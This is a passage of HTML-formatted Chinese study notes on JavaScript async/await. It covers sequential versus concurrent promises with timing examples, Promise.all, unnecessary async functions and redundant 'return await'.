-webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  });</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">};</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">async function timeTest() {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">}</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">let startTime = Date.now();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  timeTest().then(() =&gt; {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let finishTime = Date.now();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let timeTaken = finishTime - startTime;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  alert(&quot;Time taken in milliseconds: &quot; + timeTaken);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">})</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">警报框报告的总运行时间大约为 9 秒。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; font-size: 12px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">function timeoutPromise(interval) {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  return new Promise((resolve, reject) =&gt; {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    setTimeout(function(){</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">      resolve(&quot;done&quot;);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    }, interval);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  });</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">};</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">async function timeTest() {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  const timeoutPromise1 = timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  const timeoutPromise2 = timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  const timeoutPromise3 = timeoutPromise(3000);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise1;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise2;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  await timeoutPromise3;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">}</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">let startTime = Date.now();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">timeTest().then(() =&gt; {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let finishTime = Date.now();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let timeTaken = finishTime - startTime;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  alert(&quot;Time taken in milliseconds: &quot; + timeTaken);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">})</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">将三个 promise 对象存储在变量中，这样可以同时启动它们关联的进程。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">promise 基本上同时开始处理，promise 将同时完成，当你运行时，将看到警报框报告总运行时间大约为 3 秒！</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">另一种做法：</span></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">import { promisify } from 'util';</font></div><div><font style="font-size: 12pt;">const sleep = promisify(setTimeout);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 这并不是最高效的实现方式，但至少它是有效的。</font></div><div><font style="font-size: 12pt;">async function sayName() {</font></div><div><font style="font-size: 12pt;">  const name = await sleep(1000, 'Presto');</font></div><div><font style="font-size: 12pt;">  const type = await sleep(2000, 'Dog');</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // 模拟繁重的计算...</font></div><div><font style="font-size: 12pt;">  for (let i = 0; i &lt; 1e9; ++i)</font></div><div><font style="font-size: 12pt;">    continue;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // 'Presto the Dog!'</font></div><div><font style="font-size: 12pt;">  return `${name} the ${type}!`;</font></div><div><font style="font-size: 12pt;">}</font></div></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt; font-weight: bold;">以下是正确的使用方式：</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// ...</font></div><div><font style="font-size: 12pt;">async function sayName() {</font></div><div><font style="font-size: 12pt;"><font>  //</font> 彼此独立的 promise 让我们可以使用这种优化，<font>安排任务优先...</font></font></div><div><font style="font-size: 12pt;">  const pending = Promise.all([</font></div><div><font style="font-size: 12pt;">    sleep(1000, 'Presto'),</font></div><div><font style="font-size: 12pt;">    sleep(2000, 'Dog'),</font></div><div><font style="font-size: 12pt;">  ]);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // ... 同步进行...</font></div><div><font style="font-size: 12pt;">  for (let i = 0; i &lt; 1e9; ++i)</font></div><div><font style="font-size: 12pt;">    continue;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // ... 再 await</font></div><div><font style="font-size: 12pt;">  const [ name, type ] = await pending;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  // 'Presto the Dog!'</font></div><div><font style="font-size: 12pt;">  return `${name} the ${type}!`;</font></div><div><font style="font-size: 12pt;">}</font></div></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 12pt;"><br/></font></div><div style="text-align: start;"><span style="font-size: 12pt; font-weight: bold;">2、如果一个</span><span style="font-size: 12pt; font-weight: bold;">函数 </span><span style="font-size: 12pt; font-weight: bold;">根本不需要“暂停” ，那么就不需要为函数添加 async </span></div><div style="text-align: start;"><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 以下代码在语义上是等价的</span></div><div><span style="font-size: 12pt;">const p1 = async () =&gt; 'Presto';</span></div><div><span style="font-size: 12pt;">const p2 = () =&gt; Promise.resolve('Presto');</span></div><div><span style="font-size: 12pt;">const p3 = () =&gt; new Promise(resolve =&gt; resolve('Presto'));</span></div><div><br/></div><div><span style="font-size: 12pt;">// 但是它们会立即 resolved</span></div><div><span style="font-size: 12pt;">// 所以不需要 promise</span></div><div><span style="font-size: 12pt;">const p4 = () =&gt; 'Presto';</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">3、使用 async 函数时，我们需要避免写 return await</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">这是因为 return await 由两个语义上独立的关键字组成：return 和 await 。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">return 关键字表示函数结束。它最终确定何时可以“弹出”当前调用堆栈。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">对于 async 函数，这类似于将一个返回值包装在已 resolved 的 promise 中。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为我们通过接受 await 函数返回的结果，async 中 的 return 和 promise 的 resolve 是等同效果的，因此可以把 return 看作是 resolved 的包装</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">因此，<span style="font-size: 12pt; font-weight: bold;">将 return 和 await 结合使用（通常）是多余的结果</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">import fetch from 'node-fetch';</font></div><div><font style="font-size: 12pt;">import { promises as fs } from 'fs';</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">/**</font></div><div><font style="font-size: 12pt;">* This function saves the JSON received from a REST API</font></div><div><font style="font-size: 12pt;">* to the hard drive.</font></div><div><font style="font-size: 12pt;">* @param {string} - File name for the destination</font></div><div><font style="font-size: 12pt;">*/</font></div><div><font style="font-size: 12pt;">async function saveJSON(output) {</font></div><div><font style="font-size: 12pt;">  const response = await fetch('https://api.github.com/');</font></div><div><font style="font-size: 12pt;">  const json = await response.json();</font></div><div><font style="font-size: 12pt;">  const text = JSON.stringify(json);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">  //  `await` 关键字在这里可能没有必要.</font></div><div><font style="font-size: 12pt;">  return await fs.writeFile(output, text);</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async function saveJSON(output) {</font></div><div><font style="font-size: 12pt;">  // ...</font></div><div><font style="font-size: 12pt;">  // 这实际上犯了和前一个例子一样的错误，只是增加了一点中间过程。</font></div><div><font style="font-size: 12pt;">  const result = await fs.writeFile(output, text);</font></div><div><font style="font-size: 12pt;">  return result;</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async function saveJSON(output) {</font></div><div><font style="font-size: 12pt;">  // ...</font></div><div><font style="font-size: 12pt;">  // 这是 &quot;转发&quot; promise 的最优化方式。</font></div><div><font style="font-size: 12pt;">  return fs.writeFile(output, text);</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><font style="font-size: 12pt;"><br/></font></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [125].jpg" type="image/jpeg" data-filename="3.jpg" width="986"/></div><div><br/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [126].jpg" type="image/jpeg" data-filename="3.jpg" width="636"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [127].jpg" type="image/jpeg" data-filename="3.jpg" width="990"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [128].jpg" type="image/jpeg" data-filename="3.jpg" width="737"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">同步写法与异步写法比较</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [129].jpg" type="image/jpeg" data-filename="3.jpg" width="1168"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [130].jpg" type="image/jpeg" data-filename="3.jpg" width="906"/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"><br/></span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [131].jpg" type="image/jpeg" data-filename="3.jpg" width="685"/></div><div><br/></div><div><br/></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 